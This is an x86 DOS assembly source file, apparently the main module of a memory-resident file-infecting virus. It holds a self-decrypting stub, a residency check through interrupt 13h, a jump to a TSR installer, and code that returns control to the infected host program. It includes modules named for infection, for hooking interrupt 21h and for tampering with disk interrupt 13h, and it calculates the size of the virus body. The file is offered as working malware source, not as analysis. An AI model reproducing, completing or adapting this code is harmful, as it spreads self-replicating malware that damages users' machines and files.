
include         #equ.inc
include         #macro.inc
include         #struc.inc
include         #header.inc

                org     100h
start:
                jmp     tsr_sh

exe_start:      mov     al, es:[0028h]
sux             label   word
                not     al
                ; normal: al=0
                ; web:    al<>0
                xor     cs:@@sux, al

                lea     si, real_code
                mov     di, si
@@2:            mov     cx, 8
@@1:            segcs   lodsb
                inc     ax
                shl     bx, 1
                or      bx, ax
                loop    @@1
                mov     cs:[di], bl
@@sux           label   byte
                inc     di
                cmp     di, offset real_code + vir_size + stamms_max_ip
                jne     @@2
                jmp     $+2

decr_size       equ     $-start

real_code:      call    stamm

                mov     ax, in_ID
                int     13h
                cmp     ax, out_ID
                je      @@continue

                call    tsr_sh

@@continue:     mov     cx, es
                add     cx, 16

                mov     ax, 1234h
lastword        save_ss
                add     ax, cx
                mov     ss, ax
                mov     sp, 1234h
lastword        save_sp

                mov     ax, 1234h
lastword        save_cs
                add     ax, cx
                push    ax
                push    1234h
lastword        save_ip

                xor     ax, ax

                retf

include         rnd.inc
include         sh_ram.inc
include         tsr_sh.inc
include         findR13.inc
include         ints.inc
include         infect.inc
include         hook21.inc
include         fuck13.inc
include         switch13.inc
include         const.inc
include         stamms.inc

vir_size        equ     $-start

include         var.inc

tsr_size        equ     $-start

                org     ($-start+256+15) and (not 15)
                db      256 dup (?)
exe_endofstack:
exe_memory      equ     ($-start+256+15)/16

                end start
